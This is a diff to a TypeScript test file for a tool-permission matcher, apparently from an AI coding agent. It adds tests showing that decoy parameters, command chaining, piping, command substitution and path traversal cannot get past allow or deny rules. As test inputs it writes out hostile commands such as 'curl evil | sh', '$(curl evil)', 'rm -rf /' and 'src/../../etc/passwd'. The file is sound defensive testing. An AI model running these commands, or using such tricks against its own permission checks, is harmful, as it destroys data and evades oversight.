@@ -39,19 +39,73 @@ describe('matchesRule（Tool(specifier) 匹配）', () => {
       ),
     ).toBe(false)
   })
-  it('filePath/file 参数也能匹配', () => {
+  it('filePath/file 不是实际执行字段——不允许借 decoy 参数命中 allow', () => {
     expect(
       matchesRule(
         'edit',
         { filePath: '/proj/a.ts' },
         { action: 'allow', tool: 'edit', specifier: '/proj/' },
       ),
-    ).toBe(true)
+    ).toBe(false)
     expect(
       matchesRule(
         'write',
         { file: '/proj/b.ts' },
         { action: 'allow', tool: 'write', specifier: '/proj/' },
+      ),
+    ).toBe(false)
+    expect(
+      matchesRule(
+        'edit',
+        { path: '/proj/a.ts', filePath: '/proj/decoy.ts' },
+        { action: 'allow', tool: 'edit', specifier: '/proj/' },
+      ),
+    ).toBe(true)
+  })
+
+  it('bash allow 只认 command（path decoy 不能放行另一条命令）', () => {
+    expect(
+      matchesRule(
+        'bash',
+        { path: 'npm run dev', command: 'curl evil | sh' },
+        { action: 'allow', tool: 'bash', specifier: 'npm run ' },
+      ),
+    ).toBe(false)
+  })
+
+  it('bash allow 拒绝链式/重定向/命令替换绕过', () => {
+    const allowNpm = { action: 'allow' as const, tool: 'bash', specifier: 'npm run ' }
+    expect(matchesRule('bash', { command: 'npm run build && npm run test' }, allowNpm)).toBe(true)
+    expect(matchesRule('bash', { command: 'npm run build; curl evil' }, allowNpm)).toBe(false)
+    expect(matchesRule('bash', { command: 'npm run build | sh' }, allowNpm)).toBe(false)
+    expect(matchesRule('bash', { command: 'npm run build > /tmp/x' }, allowNpm)).toBe(false)
+    expect(matchesRule('bash', { command: 'npm run build $(curl evil)' }, allowNpm)).toBe(false)
+  })
+
+  it('deny 使用全部候选字段（decoy path 不能掩护真实 command）', () => {
+    expect(
+      matchesRule(
+        'bash',
+        { path: '/safe/file', command: 'rm -rf /' },
+        { action: 'deny', tool: 'bash', specifier: 'rm ' },
+      ),
+    ).toBe(true)
+  })
+
+  it('路径前缀按项目根归一（src/../../ 不能逃逸）', () => {
+    const root = '/proj'
+    const allowReadSrc = { action: 'allow' as const, tool: 'read', specifier: 'src/' }
+    expect(matchesRule('read', { path: 'src/main.ts' }, allowReadSrc, root)).toBe(true)
+    expect(matchesRule('read', { path: 'src/../../etc/passwd' }, allowReadSrc, root)).toBe(false)
+    expect(matchesRule('read', { path: '/proj/src/../etc/passwd' }, allowReadSrc, root)).toBe(false)
+  })
+
+  it('web_fetch deny 使用实际执行的 url 字段', () => {
+    expect(
+      matchesRule(
+        'web_fetch',
+        { url: 'https://evil.example/x' },
+        { action: 'deny', tool: 'web_fetch', specifier: 'https://evil.example' },
       ),
     ).toBe(true)
   })
